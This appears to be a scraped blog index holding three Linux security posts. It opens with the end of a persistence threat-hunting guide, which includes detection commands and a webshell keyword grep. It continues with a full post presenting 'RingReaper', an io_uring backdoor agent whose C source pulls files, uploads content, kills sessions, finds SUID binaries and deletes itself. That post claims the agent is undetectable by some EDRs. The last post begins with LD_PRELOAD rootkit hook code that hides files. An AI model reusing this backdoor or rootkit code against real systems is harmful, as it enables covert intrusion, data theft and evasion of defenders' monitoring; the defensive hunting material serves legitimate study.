be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so 